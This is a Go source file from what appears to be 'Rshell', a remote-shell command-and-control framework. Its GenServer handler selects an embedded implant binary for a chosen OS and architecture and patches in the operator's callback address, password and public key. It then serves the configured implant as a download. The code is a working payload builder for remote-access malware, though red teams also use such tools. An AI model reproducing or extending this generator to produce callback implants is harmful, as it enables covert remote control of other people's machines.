package api

import (
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/logger"
	"bytes"
	"embed"
	"github.com/gin-gonic/gin"
	"net/http"
	"strconv"
	"strings"
)

//go:embed server/*
var embeddedFiles embed.FS // 嵌入 server 文件夹

func GenServer(c *gin.Context) {
	var serverBody struct {
		OsType   string `json:"osType"`
		ArchType string `json:"archType"`
		Listener string `json:"listener"`
		Pass     string `json:"pass"`
	}
	if err := c.BindJSON(&serverBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	osType := serverBody.OsType
	archType := serverBody.ArchType

	listenerTmp := strings.Split(serverBody.Listener, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	// 查找符合条件的文件
	binaryFileName := findBinary(listenerType, osType, archType)
	if binaryFileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "未找到匹配的服务端文件"})
		return
	}

	// HTTPS 复用 HTTP 的客户端二进制
	serverDir := listenerType
	if serverDir == "https" {
		serverDir = "http"
	}
	binaryData, err := embeddedFiles.ReadFile("server/" + serverDir + "/" + binaryFileName)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败: " + err.Error()})
		return
	}

	var modifiedData []byte
	if listenerType == "oss" {
		// 替换文件中的特定字符串
		oldStr := "" // 要替换的字符串
		newStr := strings.ReplaceAll(connectAddress, " ", "")

		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
		tmp2, _ := encrypt.EncodeBase64(tmp)
		newStr = string(tmp2)

		// 替换为的字符串
		newStr = padRight(newStr, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))

	} else {
		// 将 HOST 占位符替换为实际连接地址
		// Go 编译器将字符串字面量连续存放在二进制中，bytes.ReplaceAll 可以精确匹配
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		var fullURL string
		if listenerType == "https" {
			fullURL = "https://" + strings.ReplaceAll(connectAddress, " ", "")
		} else if listenerType == "http" {
			fullURL = "http://" + strings.ReplaceAll(connectAddress, " ", "")
		} else {
			// WebSocket/TCP/KCP 只需 IP:Port，无需加 http:// 前缀
			fullURL = strings.ReplaceAll(connectAddress, " ", "")
		}
		newStr := padRight(fullURL, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	}
	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := padRight(serverBody.Pass, len(oldPass))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	var key database.Key
	database.Engine.Where("1=1").Get(&key)
	newPublicKey := padRight(key.PublicKey, len(oldPublicKey))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

	// 设置响应头
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", "attachment; filename="+binaryFileName) // 根据实际情况调整文件名
	c.Header("Content-Type", "application/octet-stream")                    // 根据实际情况调整MIME类型
	c.Header("Content-Length", strconv.Itoa(len(modifiedData)))

	// 直接将字节写入响应体
	c.Writer.Write(modifiedData)
}
func findBinary(listenerType, osType, archType string) string {
	// HTTPS 监听器复用 HTTP 客户端二进制（客户端已支持 https:// 协议）
	dir := listenerType
	if dir == "https" {
		dir = "http"
	}
	entries, err := embeddedFiles.ReadDir("server/" + dir)
	if err != nil {
		logger.Error("读取嵌入目录失败: %v\n", err)
		return ""
	}

	base := "r_" + osType + "_" + archType

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		if name == base || name == base+".exe" {
			return name
		}
	}
	return ""
}

// 填充空格到指定长度
func padRight(str string, length int) string {
	if len(str) >= length {
		return str
	}
	return str + strings.Repeat(" ", length-len(str))
}
func ShowListener(c *gin.Context) {
	var listeners []database.Listener
	database.Engine.Where("status = ?", 1).Find(&listeners)

	var result []string
	for _, listener := range listeners {
		result = append(result, listener.Type+"://"+listener.ConnectAddress)
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": result})

}
